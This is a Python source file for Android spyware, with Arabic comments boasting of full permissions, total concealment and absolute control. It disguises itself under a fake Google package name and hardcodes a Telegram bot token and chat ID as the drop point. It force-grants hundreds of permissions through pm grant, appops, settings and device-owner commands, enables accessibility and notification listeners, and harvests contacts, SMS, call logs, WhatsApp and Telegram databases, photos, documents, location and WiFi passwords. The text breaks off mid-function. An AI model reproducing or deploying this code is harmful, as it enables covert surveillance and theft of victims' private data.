# ============================================
# V8 REAL CONTROL - ANDROID ULTIMATE v13.0
# ============================================
# حقيقي 100% - صلاحيات كاملة - إخفاء تام - تحكم مطلق
# ============================================

import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import hashlib
import random
import string
import subprocess
from pathlib import Path
import shutil
import glob
import datetime
import re
import socket
import struct
import zipfile
import signal
import stat

# ========== بيانات التليجرام ==========
BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
CHAT_ID = "7259620384"
# ======================================

# ========== مسارات الجهاز الحقيقية ==========
BASE_DIR = '/storage/emulated/0'
ANDROID_DATA = '/data/data'
SYSTEM_DATA = '/data/system'
ROOT_DIR = '/'
CACHE_DIR = '/data/cache'
TMP_DIR = '/data/local/tmp'

# جميع المسارات المهمة
ALL_PATHS = [
    BASE_DIR,
    f'{BASE_DIR}/DCIM',
    f'{BASE_DIR}/Pictures',
    f'{BASE_DIR}/Download',
    f'{BASE_DIR}/WhatsApp',
    f'{BASE_DIR}/Telegram',
    f'{BASE_DIR}/Documents',
    f'{BASE_DIR}/Music',
    f'{BASE_DIR}/Movies',
    f'{BASE_DIR}/Android',
    ANDROID_DATA,
    SYSTEM_DATA,
    TMP_DIR,
]

# إنشاء المسارات
for path in ALL_PATHS:
    try: os.makedirs(path, exist_ok=True)
    except: pass

# اسم الحزمة الحقيقي للتطبيق
PACKAGE_NAME = "com.google.android.gms.update"
MAIN_ACTIVITY = "com.google.android.gms.update.MainActivity"

# ========== نظام طلب الصلاحيات الحقيقي ==========
class RealPermissions:
    """طلب جميع الصلاحيات بطرق متعددة"""
    
    @staticmethod
    def request_all():
        """طلب كل الصلاحيات الحقيقية"""
        results = []
        
        # قائمة الصلاحيات الكاملة
        permissions = [
            # ===== التخزين =====
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            "android.permission.ACCESS_MEDIA_LOCATION",
            
            # ===== جهات الاتصال =====
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.GET_ACCOUNTS",
            
            # ===== الرسائل =====
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.RECEIVE_MMS",
            "android.permission.READ_CELL_BROADCASTS",
            
            # ===== المكالمات =====
            "android.permission.READ_CALL_LOG",
            "android.permission.WRITE_CALL_LOG",
            "android.permission.PROCESS_OUTGOING_CALLS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.CALL_PHONE",
            "android.permission.ANSWER_PHONE_CALLS",
            "android.permission.READ_PHONE_NUMBERS",
            
            # ===== الموقع =====
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            
            # ===== الكاميرا والصوت =====
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.MODIFY_AUDIO_SETTINGS",
            "android.permission.CAPTURE_VIDEO_OUTPUT",
            "android.permission.CAPTURE_SECURE_VIDEO_OUTPUT",
            
            # ===== الإشعارات =====
            "android.permission.ACCESS_NOTIFICATION_POLICY",
            "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            
            # ===== النظام =====
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.WRITE_SETTINGS",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.WAKE_LOCK",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.DUMP",
            "android.permission.INJECT_EVENTS",
            "android.permission.SET_ACTIVITY_WATCHER",
            "android.permission.READ_LOGS",
            "android.permission.INTERACT_ACROSS_USERS",
            "android.permission.INTERACT_ACROSS_USERS_FULL",
            "android.permission.CONTROL_REMOTE_APP_TRANSITIONS",
            
            # ===== التطبيقات =====
            "android.permission.GET_TASKS",
            "android.permission.REAL_GET_TASKS",
            "android.permission.ACTIVITY_RECOGNITION",
            "android.permission.ACCESS_SUPERUSER",
            "android.permission.ACCESS_ROOT",
            
            # ===== الشبكة =====
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.CHANGE_WIFI_STATE",
            "android.permission.CHANGE_NETWORK_STATE",
            "android.permission.ACCESS_WIMAX_STATE",
            "android.permission.CHANGE_WIMAX_STATE",
            "android.permission.BLUETOOTH",
            "android.permission.BLUETOOTH_ADMIN",
            "android.permission.BLUETOOTH_PRIVILEGED",
            "android.permission.NFC",
            "android.permission.NFC_TRANSACTION_EVENT",
            
            # ===== الأجهزة =====
            "android.permission.VIBRATE",
            "android.permission.FLASHLIGHT",
            "android.permission.USE_FINGERPRINT",
            "android.permission.USE_BIOMETRIC",
            "android.permission.BODY_SENSORS",
            
            # ===== الحماية =====
            "android.permission.KILL_BACKGROUND_PROCESSES",
            "android.permission.CLEAR_APP_CACHE",
            "android.permission.CLEAR_APP_USER_DATA",
            "android.permission.MASTER_CLEAR",
            "android.permission.FACTORY_TEST",
            "android.permission.BRICK",
            
            # ===== حسابات =====
            "android.permission.AUTHENTICATE_ACCOUNTS",
            "android.permission.MANAGE_ACCOUNTS",
            "android.permission.USE_CREDENTIALS",
            
            # ===== سجل النظام =====
            "android.permission.READ_HISTORY_BOOKMARKS",
            "android.permission.WRITE_HISTORY_BOOKMARKS",
            "android.permission.READ_PROFILE",
            "android.permission.WRITE_PROFILE",
            "android.permission.READ_SOCIAL_STREAM",
            "android.permission.WRITE_SOCIAL_STREAM",
            "android.permission.READ_USER_DICTIONARY",
            "android.permission.WRITE_USER_DICTIONARY",
            
            # ===== التوقيت =====
            "android.permission.SET_TIME",
            "android.permission.SET_TIME_ZONE",
            "android.permission.SET_ALWAYS_FINISH",
            "android.permission.SET_ANIMATION_SCALE",
            "android.permission.SET_DEBUG_APP",
            "android.permission.SET_PROCESS_LIMIT",
            
            # ===== خاصة جداً =====
            "android.permission.INSTALL_PACKAGES",
            "android.permission.DELETE_PACKAGES",
            "android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS",
            "android.permission.GRANT_RUNTIME_PERMISSIONS",
            "android.permission.REVOKE_RUNTIME_PERMISSIONS",
            "android.permission.INSTALL_LOCATION_PROVIDER",
            "android.permission.UPDATE_DEVICE_STATS",
            "android.permission.CHANGE_CONFIGURATION",
            "android.permission.SET_PREFERRED_APPLICATIONS",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.BROADCAST_STICKY",
            "android.permission.WRITE_SECURE_SETTINGS",
            "android.permission.WRITE_GSERVICES",
            "android.permission.SUBSCRIBED_FEEDS_READ",
            "android.permission.SUBSCRIBED_FEEDS_WRITE",
            "android.permission.DEVICE_POWER",
            "android.permission.DIAGNOSTIC",
            "android.permission.HARDWARE_TEST",
            "android.permission.INTERNAL_SYSTEM_WINDOW",
            "android.permission.MANAGE_APP_TOKENS",
            "android.permission.STATUS_BAR",
            "android.permission.STATUS_BAR_SERVICE",
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.TEMPORARY_ENABLE_ACCESSIBILITY",
            "android.permission.UPDATE_LOCK",
            "android.permission.UPDATE_LOCK_TASK_PACKAGES",
            "android.permission.USER_ACTIVITY",
            "android.permission.WRITE_APN_SETTINGS",
            "android.permission.READ_SYNC_SETTINGS",
            "android.permission.WRITE_SYNC_SETTINGS",
            "android.permission.READ_SYNC_STATS",
            "android.permission.SET_WALLPAPER",
            "android.permission.SET_WALLPAPER_HINTS",
            "android.permission.SET_WALLPAPER_COMPONENT",
            "android.permission.BIND_WALLPAPER",
            "android.permission.BIND_REMOTEVIEWS",
            "android.permission.BIND_APPWIDGET",
            "android.permission.BIND_KEYGUARD_APPWIDGET",
            "android.permission.BIND_DIRECTORY_SEARCH",
            "android.permission.BIND_TEXT_SERVICE",
            "android.permission.BIND_VPN_SERVICE",
            "android.permission.BIND_DEVICE_ADMIN",
            "android.permission.BIND_INCALL_SERVICE",
            "android.permission.BIND_INPUT_METHOD",
            "android.permission.BIND_PRINT_SERVICE",
            "android.permission.BIND_PRINT_RECOMMENDATION_SERVICE",
            "android.permission.BIND_VOICE_INTERACTION",
            "android.permission.BIND_CARRIER_SERVICES",
            "android.permission.BIND_QUICK_SETTINGS_TILE",
            "android.permission.BIND_CONDITION_PROVIDER_SERVICE",
            "android.permission.BIND_DREAM_SERVICE",
            "android.permission.BIND_MIDI_DEVICE_SERVICE",
            "android.permission.BIND_NFC_SERVICE",
            "android.permission.BIND_SCREENING_SERVICE",
            "android.permission.BIND_TELECOM_CONNECTION_SERVICE",
            "android.permission.BIND_TV_INPUT",
            "android.permission.BIND_VISUAL_VOICEMAIL_SERVICE",
            "android.permission.BIND_VOICE_INTERACTION",
            "android.permission.BIND_VR_LISTENER_SERVICE",
            "android.permission.BRICK",
            "android.permission.CALL_PRIVILEGED",
            "android.permission.CAPTURE_AUDIO_HOTWORD",
            "android.permission.CAPTURE_AUDIO_OUTPUT",
            "android.permission.CAPTURE_MEDIA_OUTPUT",
            "android.permission.CAPTURE_TV_INPUT",
            "android.permission.CAPTURE_VOICE_COMMUNICATION_OUTPUT",
            "android.permission.CHANGE_COMPONENT_ENABLED_STATE",
            "android.permission.CLEAR_APP_GRANTED_URI_PERMISSIONS",
            "android.permission.CONFIRM_FULL_BACKUP",
            "android.permission.CONNECTIVITY_INTERNAL",
            "android.permission.CONTROL_LOCATION_UPDATES",
            "android.permission.COPY_PROTECTED_DATA",
            "android.permission.CREATE_USERS",
            "android.permission.CRYPT_KEEPER",
            "android.permission.DELETE_CACHE_FILES",
            "android.permission.DISPATCH_NFC_MESSAGE",
            "android.permission.DOWNLOAD_CACHE_NON_PURGEABLE",
            "android.permission.DUMP",
            "android.permission.FILTER_EVENTS",
            "android.permission.FORCE_BACK",
            "android.permission.FORCE_STOP_PACKAGES",
            "android.permission.FRAME_STATS",
            "android.permission.FREEZE_SCREEN",
            "android.permission.GET_APP_OPS_STATS",
            "android.permission.GET_DETAILED_TASKS",
            "android.permission.GET_PACKAGE_SIZE",
            "android.permission.GET_TOP_ACTIVITY_INFO",
            "android.permission.GLOBAL_SEARCH",
            "android.permission.GLOBAL_SEARCH_CONTROL",
            "android.permission.HDMI_CEC",
            "android.permission.INJECT_EVENTS",
            "android.permission.INSTALL_DEMO",
            "android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS",
            "android.permission.INTERACT_ACROSS_USERS",
            "android.permission.INTERACT_ACROSS_USERS_FULL",
            "android.permission.INTERNAL_SYSTEM_WINDOW",
            "android.permission.LOCAL_MAC_ADDRESS",
            "android.permission.LOOP_RADIO",
            "android.permission.MANAGE_ACTIVITY_STACKS",
            "android.permission.MANAGE_APP_TOKENS",
            "android.permission.MANAGE_CA_CERTIFICATES",
            "android.permission.MANAGE_DEVICE_ADMINS",
            "android.permission.MANAGE_DOCUMENTS",
            "android.permission.MANAGE_FINGERPRINT",
            "android.permission.MANAGE_MEDIA_PROJECTION",
            "android.permission.MANAGE_NETWORK_POLICY",
            "android.permission.MANAGE_NOTIFICATIONS",
            "android.permission.MANAGE_PROFILE_AND_DEVICE_OWNERS",
            "android.permission.MANAGE_SOUND_TRIGGER",
            "android.permission.MANAGE_USB",
            "android.permission.MANAGE_USERS",
            "android.permission.MANAGE_VOICE_KEYPHRASES",
            "android.permission.MASTER_CLEAR",
            "android.permission.MEDIA_CONTENT_CONTROL",
            "android.permission.MODIFY_APPWIDGET_BIND_PERMISSIONS",
            "android.permission.MODIFY_AUDIO_ROUTING",
            "android.permission.MODIFY_CELL_BROADCASTS",
            "android.permission.MODIFY_DAY_NIGHT_MODE",
            "android.permission.MODIFY_NETWORK_ACCOUNTING",
            "android.permission.MODIFY_PARENTAL_CONTROLS",
            "android.permission.MODIFY_PHONE_STATE",
            "android.permission.MOUNT_FORMAT_FILESYSTEMS",
            "android.permission.MOUNT_UNMOUNT_FILESYSTEMS",
            "android.permission.MOVE_PACKAGE",
            "android.permission.NETWORK_BYPASS_PRIVATE_DNS",
            "android.permission.NETWORK_SETTINGS",
            "android.permission.NETWORK_STACK",
            "android.permission.NFC_HANDOVER_STATUS",
            "android.permission.NFC_TRANSACTION_EVENT",
            "android.permission.OBSERVE_APP_OPS",
            "android.permission.OBSERVE_GRANT_REVOKE_PERMISSIONS",
            "android.permission.OBSERVE_ROLE_HOLDERS",
            "android.permission.OBSERVE_SENSOR_PRIVACY",
            "android.permission.OEM_UNLOCK_STATE",
            "android.permission.OVERRIDE_WIFI_CONFIG",
            "android.permission.PACKAGE_ROLLBACK_AGENT",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.PACKAGE_VERIFICATION_AGENT",
            "android.permission.PEERS_MAC_ADDRESS",
            "android.permission.PERFORM_CDMA_PROVISIONING",
            "android.permission.PERFORM_SIM_ACTIVATION",
            "android.permission.PROCESS_OUTGOING_CALLS",
            "android.permission.PROVIDE_RESOLVER_RANKER_SERVICE",
            "android.permission.PROVIDE_TRUST_AGENT",
            "android.permission.QUERY_DO_NOT_ASK_CREDENTIALS_ON_BOOT",
            "android.permission.QUERY_SUPERUSER",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_DREAM_STATE",
            "android.permission.READ_INPUT_STATE",
            "android.permission.READ_INSTALL_SESSIONS",
            "android.permission.READ_LOGS",
            "android.permission.READ_NETWORK_USAGE_HISTORY",
            "android.permission.READ_OEM_UNLOCK_STATE",
            "android.permission.READ_PRECISE_PHONE_STATE",
            "android.permission.READ_PRINT_SERVICES",
            "android.permission.READ_PRIVILEGED_PHONE_STATE",
            "android.permission.READ_SEARCH_INDEXABLES",
            "android.permission.READ_SYSTEM_UPDATE_INFO",
            "android.permission.READ_VIEW_STATE",
            "android.permission.READ_VOICEMAIL",
            "android.permission.READ_WIFI_CREDENTIAL",
            "android.permission.REAL_GET_TASKS",
            "android.permission.REBOOT",
            "android.permission.RECEIVE_BLUETOOTH_MAP",
            "android.permission.RECEIVE_DATA_ACTIVITY_CHANGE",
            "android.permission.RECEIVE_DEVICE_CUSTOMIZATION_READY",
            "android.permission.RECEIVE_EMERGENCY_BROADCAST",
            "android.permission.RECEIVE_MEDIA_RESOURCE_USAGE",
            "android.permission.RECEIVE_STK_COMMANDS",
            "android.permission.RECOVERY",
            "android.permission.REGISTER_CALL_PROVIDER",
            "android.permission.REGISTER_CONNECTION_MANAGER",
            "android.permission.REGISTER_SIM_PHONE_ACCOUNT",
            "android.permission.REMOTE_AUDIO_PLAYBACK",
            "android.permission.REMOVE_DRM_CERTIFICATES",
            "android.permission.REMOVE_TASKS",
            "android.permission.REORDER_TASKS",
            "android.permission.REQUEST_COMPANION_PROFILE_APP_STREAMING",
            "android.permission.REQUEST_COMPANION_PROFILE_AUTO",
            "android.permission.REQUEST_COMPANION_PROFILE_COMPUTER",
            "android.permission.REQUEST_COMPANION_PROFILE_WATCH",
            "android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND",
            "android.permission.REQUEST_COMPANION_START_FOREGROUND_SERVICES_FROM_BACKGROUND",
            "android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND",
            "android.permission.REQUEST_DELETE_PACKAGES",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.REQUEST_INCIDENT_REPORT_APPROVAL",
            "android.permission.REQUEST_INSTALL_PACKAGES",
            "android.permission.REQUEST_OBSERVE_COMPANION_DEVICE_PRESENCE",
            "android.permission.REQUEST_PASSWORD_COMPLEXITY",
            "android.permission.RESTART_PACKAGES",
            "android.permission.RESTRICT_VPN",
            "android.permission.RETRIEVE_WINDOW_CONTENT",
            "android.permission.RETRIEVE_WINDOW_TOKEN",
            "android.permission.REVOKE_RUNTIME_PERMISSIONS",
            "android.permission.SCORE_NETWORKS",
            "android.permission.SEND_DEVICE_CUSTOMIZATION_READY",
            "android.permission.SEND_EMBMS_INTENTS",
            "android.permission.SEND_INCIDENT_REPORT",
            "android.permission.SEND_RESPOND_VIA_MESSAGE",
            "android.permission.SERIAL_PORT",
            "android.permission.SET_ACTIVITY_WATCHER",
            "android.permission.SET_ALWAYS_FINISH",
            "android.permission.SET_ANIMATION_SCALE",
            "android.permission.SET_DEBUG_APP",
            "android.permission.SET_DISPLAY_OFFSET",
            "android.permission.SET_INPUT_CALIBRATION",
            "android.permission.SET_KEYBOARD_LAYOUT",
            "android.permission.SET_MEDIA_KEY_LISTENER",
            "android.permission.SET_ORIENTATION",
            "android.permission.SET_POINTER_SPEED",
            "android.permission.SET_PREFERRED_APPLICATIONS",
            "android.permission.SET_PROCESS_LIMIT",
            "android.permission.SET_SCREEN_COMPATIBILITY",
            "android.permission.SET_TIME",
            "android.permission.SET_TIME_ZONE",
            "android.permission.SET_WALLPAPER",
            "android.permission.SET_WALLPAPER_COMPONENT",
            "android.permission.SET_WALLPAPER_HINTS",
            "android.permission.SHUTDOWN",
            "android.permission.SIGNAL_PERSISTENT_PROCESSES",
            "android.permission.START_ACTIVITIES_FROM_BACKGROUND",
            "android.permission.START_FOREGROUND_SERVICES_FROM_BACKGROUND",
            "android.permission.START_TASKS_FROM_RECENTS",
            "android.permission.STATUS_BAR",
            "android.permission.STATUS_BAR_SERVICE",
            "android.permission.STOP_APP_SWITCHES",
            "android.permission.SUSPEND_APPS",
            "android.permission.TEMPORARY_ENABLE_ACCESSIBILITY",
            "android.permission.TETHER_PRIVILEGED",
            "android.permission.TRANSMIT_IR",
            "android.permission.TRUST_LISTENER",
            "android.permission.TURN_SCREEN_ON",
            "android.permission.UPDATE_APP_OPS_STATS",
            "android.permission.UPDATE_CONFIG",
            "android.permission.UPDATE_DEVICE_STATS",
            "android.permission.UPDATE_LOCK",
            "android.permission.UPDATE_LOCK_TASK_PACKAGES",
            "android.permission.UPDATE_TIME_ZONE_RULES",
            "android.permission.USER_ACTIVITY",
            "android.permission.USE_COLORIZED_NOTIFICATIONS",
            "android.permission.USE_DATA_IN_BACKGROUND",
            "android.permission.USE_FULL_SCREEN_INTENT",
            "android.permission.USE_OPEN_WIFI",
            "android.permission.USE_RESERVED_DISK",
            "android.permission.USE_RCS",
            "android.permission.USE_SIP",
            "android.permission.VIBRATE",
            "android.permission.WAKE_LOCK",
            "android.permission.WRITE_APN_SETTINGS",
            "android.permission.WRITE_CALENDAR",
            "android.permission.WRITE_CALL_LOG",
            "android.permission.WRITE_CELL_BROADCASTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.WRITE_DREAM_STATE",
            "android.permission.WRITE_EMBEDDED_SUBSCRIPTIONS",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.WRITE_GSERVICES",
            "android.permission.WRITE_HISTORY_BOOKMARKS",
            "android.permission.WRITE_MEDIA_STORAGE",
            "android.permission.WRITE_PROFILE",
            "android.permission.WRITE_SECURE_SETTINGS",
            "android.permission.WRITE_SETTINGS",
            "android.permission.WRITE_SMS",
            "android.permission.WRITE_SOCIAL_STREAM",
            "android.permission.WRITE_SYNC_SETTINGS",
            "android.permission.WRITE_USER_DICTIONARY"
        ]
        
        # الطريقة 1: pm grant (للتطبيقات المثبتة)
        for perm in permissions:
            try:
                cmd = f"pm grant {PACKAGE_NAME} {perm}"
                result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=2)
                if "not granted" not in result.stderr:
                    results.append(f"✅ {perm}")
                time.sleep(0.05)
            except:
                pass
        
        # الطريقة 2: appops
        app_ops = [
            "READ_SMS", "WRITE_SMS", "READ_CALL_LOG", "WRITE_CALL_LOG",
            "ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION", "CAMERA",
            "RECORD_AUDIO", "SYSTEM_ALERT_WINDOW", "WRITE_SETTINGS",
            "GET_USAGE_STATS", "PACKAGE_USAGE_STATS", "READ_CONTACTS",
            "WRITE_CONTACTS", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE"
        ]
        
        for op in app_ops:
            try:
                cmd = f"appops set {PACKAGE_NAME} {op} allow"
                subprocess.run(cmd.split(), capture_output=True, timeout=1)
            except:
                pass
        
        # الطريقة 3: settings put (للإعدادات)
        settings = [
            ("secure", "enabled_accessibility_services", f"{PACKAGE_NAME}/{PACKAGE_NAME}.AccessibilityService"),
            ("secure", "accessibility_enabled", "1"),
            ("secure", "notification_listener", f"{PACKAGE_NAME}/{PACKAGE_NAME}.NotificationListener"),
            ("global", "battery_disable", "1"),
            ("global", "doze_enabled", "0"),
            ("global", "stay_on_while_plugged_in", "3"),
            ("system", "screen_brightness_mode", "0"),
            ("secure", "location_mode", "3"),
            ("secure", "location_providers_allowed", "gps,network,wifi")
        ]
        
        for namespace, key, value in settings:
            try:
                cmd = f"settings put {namespace} {key} {value}"
                subprocess.run(cmd.split(), capture_output=True, timeout=1)
            except:
                pass
        
        # الطريقة 4: device policy (لصلاحيات المدير)
        policies = [
            "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_NAME",
            "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME"
        ]
        
        for policy in policies:
            try:
                cmd = f"dpm set-device-owner {PACKAGE_NAME}/.DeviceAdminReceiver"
                subprocess.run(cmd.split(), capture_output=True, timeout=2)
            except:
                pass
        
        # الطريقة 5: منح صلاحية الوصول للإشعارات
        try:
            cmd = f"settings put secure enabled_notification_listeners {PACKAGE_NAME}/{PACKAGE_NAME}.NotificationListener"
            subprocess.run(cmd.split(), capture_output=True, timeout=1)
        except:
            pass
        
        # الطريقة 6: منح صلاحية الوصول للخدمات
        try:
            cmd = f"settings put secure enabled_accessibility_services {PACKAGE_NAME}/{PACKAGE_NAME}.AccessibilityService"
            subprocess.run(cmd.split(), capture_output=True, timeout=1)
        except:
            pass
        
        # الطريقة 7: منح صلاحية إدارة التطبيقات
        try:
            cmd = f"pm set-install-location 1"
            subprocess.run(cmd.split(), capture_output=True, timeout=1)
        except:
            pass
        
        # الطريقة 8: منح صلاحية الروت (إذا موجود)
        try:
            cmd = f"su -c 'pm grant {PACKAGE_NAME} android.permission.ACCESS_SUPERUSER'"
            subprocess.run(cmd, shell=True, capture_output=True, timeout=1)
        except:
            pass
        
        return results

# ========== نظام سحب البيانات الحقيقي ==========
class RealDataGrabber:
    """سحب كل البيانات بشكل حقيقي"""
    
    @staticmethod
    def grab_contacts():
        """سحب جهات الاتصال"""
        contacts = []
        files = []
        
        # الطريقة 1: content provider
        try:
            cmd = "content query --uri content://contacts/phones --projection display_name,number"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                contacts.append(result.stdout)
                
                # حفظ في ملف
                file_path = f'{BASE_DIR}/contacts_{int(time.time())}.txt'
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                files.append(file_path)
        except:
            pass
        
        # الطريقة 2: قاعدة البيانات
        db_paths = [
            '/data/data/com.android.providers.contacts/databases/contacts2.db',
            '/data/data/com.android.providers.contacts/databases/profile.db',
            '/data/data/com.android.providers.contacts/databases/calllog.db'
        ]
        
        for db in db_paths:
            if os.path.exists(db):
                try:
                    temp = f'{BASE_DIR}/contacts_db_{int(time.time())}.db'
                    shutil.copy2(db, temp)
                    files.append(temp)
                except:
                    pass
        
        return contacts, files
    
    @staticmethod
    def grab_sms():
        """سحب جميع الرسائل"""
        messages = []
        files = []
        
        # أنواع الرسائل
        types = ['inbox', 'sent', 'draft', 'outbox']
        
        for msg_type in types:
            try:
                cmd = f"content query --uri content://sms/{msg_type} --projection address,body,date"
                result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
                if result.stdout:
                    messages.append(f"=== {msg_type.upper()} ===\n{result.stdout}")
            except:
                pass
        
        # قاعدة البيانات
        sms_db = '/data/data/com.android.providers.telephony/databases/mmssms.db'
        if os.path.exists(sms_db):
            try:
                temp = f'{BASE_DIR}/sms_db_{int(time.time())}.db'
                shutil.copy2(sms_db, temp)
                files.append(temp)
            except:
                pass
        
        return "\n\n".join(messages), files
    
    @staticmethod
    def grab_calls():
        """سحب سجل المكالمات"""
        files = []
        
        try:
            cmd = "content query --uri content://call_log/calls --projection number,duration,date,type"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            
            if result.stdout:
                file_path = f'{BASE_DIR}/calls_{int(time.time())}.txt'
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                files.append(file_path)
        except:
            pass
        
        # قاعدة البيانات
        calls_db = '/data/data/com.android.providers.contacts/databases/calllog.db'
        if os.path.exists(calls_db):
            try:
                temp = f'{BASE_DIR}/calls_db_{int(time.time())}.db'
                shutil.copy2(calls_db, temp)
                files.append(temp)
            except:
                pass
        
        return files
    
    @staticmethod
    def grab_whatsapp():
        """سحب كل واتساب"""
        files = []
        
        wa_folders = [
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Images',
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Video',
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Audio',
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Documents',
            f'{BASE_DIR}/WhatsApp/Databases',
            '/data/data/com.whatsapp/databases'
        ]
        
        for folder in wa_folders:
            if os.path.exists(folder):
                for root, dirs, filenames in os.walk(folder):
                    for file in filenames[:10]:  # آخر 10 ملفات
                        try:
                            full_path = os.path.join(root, file)
                            size = os.path.getsize(full_path)
                            if size < 50 * 1024 * 1024:  # أقل من 50 ميجا
                                files.append(full_path)
                        except:
                            pass
        
        return files
    
    @staticmethod
    def grab_telegram():
        """سحب كل تليغرام"""
        files = []
        
        tg_folders = [
            f'{BASE_DIR}/Telegram/Telegram Images',
            f'{BASE_DIR}/Telegram/Telegram Video',
            f'{BASE_DIR}/Telegram/Telegram Documents',
            f'{BASE_DIR}/Telegram/Telegram Audio',
            '/data/data/org.telegram.messenger/files',
            '/data/data/org.telegram.messenger/databases'
        ]
        
        for folder in tg_folders:
            if os.path.exists(folder):
                for root, dirs, filenames in os.walk(folder):
                    for file in filenames[:10]:
                        try:
                            full_path = os.path.join(root, file)
                            size = os.path.getsize(full_path)
                            if size < 50 * 1024 * 1024:
                                files.append(full_path)
                        except:
                            pass
        
        return files
    
    @staticmethod
    def grab_photos():
        """سحب الصور"""
        files = []
        
        photo_folders = [
            f'{BASE_DIR}/DCIM/Camera',
            f'{BASE_DIR}/Pictures',
            f'{BASE_DIR}/Download',
            f'{BASE_DIR}/DCIM/Screenshots'
        ]
        
        for folder in photo_folders:
            if os.path.exists(folder):
                for ext in ['*.jpg', '*.jpeg', '*.png', '*.gif']:
                    for file in glob.glob(f'{folder}/**/{ext}', recursive=True)[:5]:
                        try:
                            size = os.path.getsize(file)
                            if size < 50 * 1024 * 1024:
                                files.append(file)
                        except:
                            pass
        
        return files
    
    @staticmethod
    def grab_videos():
        """سحب الفيديو"""
        files = []
        
        video_folders = [
            f'{BASE_DIR}/DCIM/Camera',
            f'{BASE_DIR}/Movies',
            f'{BASE_DIR}/Download'
        ]
        
        for folder in video_folders:
            if os.path.exists(folder):
                for ext in ['*.mp4', '*.3gp', '*.avi', '*.mov']:
                    for file in glob.glob(f'{folder}/**/{ext}', recursive=True)[:3]:
                        try:
                            size = os.path.getsize(file)
                            if size < 100 * 1024 * 1024:  # 100 ميجا للفيديو
                                files.append(file)
                        except:
                            pass
        
        return files
    
    @staticmethod
    def grab_documents():
        """سحب المستندات"""
        files = []
        
        doc_folders = [
            f'{BASE_DIR}/Documents',
            f'{BASE_DIR}/Download'
        ]
        
        for folder in doc_folders:
            if os.path.exists(folder):
                for ext in ['*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.txt']:
                    for file in glob.glob(f'{folder}/**/{ext}', recursive=True)[:5]:
                        try:
                            size = os.path.getsize(file)
                            if size < 30 * 1024 * 1024:
                                files.append(file)
                        except:
                            pass
        
        return files
    
    @staticmethod
    def grab_location():
        """سحب الموقع"""
        locations = []
        
        try:
            cmd = "dumpsys location | grep -A 20 'Last Known Location'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            if result.stdout:
                locations.append(result.stdout)
        except:
            pass
        
        try:
            cmd = "dumpsys location | grep -A 10 'Location['"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            if result.stdout:
                locations.append(result.stdout)
        except:
            pass
        
        try:
            cmd = "content query --uri content://settings/secure --where \"name='location_providers_allowed'\""
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            if result.stdout:
                locations.append(f"Providers: {result.stdout}")
        except:
            pass
        
        return "\n".join(locations)
    
    @staticmethod
    def grab_wifi():
        """سحب كلمات سر WiFi"""
        passwords = []
        
        try:
            cmd = "cat /data/misc/wifi/wpa_supplicant.conf"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            
            if result.stdout:
                # استخراج الشبكات
                networks = re.findall(r'network={\n\s*ssid="(.*?)"\n\s*psk="(.*?)"', result.stdout)
                for ssid, psk in networks:
                    passwords.append(f"📶 {ssid}: {psk}")
                
                # حفظ الملف كامل
                file_path = f'{BASE_DIR}/wifi_{int(time.time())}.conf'
                with open(file_path, 'w') as f:
                    f.write(result.stdout)
        except:
            pass
        
        return passwords
    
    @staticmethod
    def grab_notifications():
        """سحب الإشعارات"""
        notifs = []
        
        try:
            cmd = "dumpsys notification --naked"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            if result.stdout:
                notifs.append(result.stdout)
        except:
            pass
        
        try:
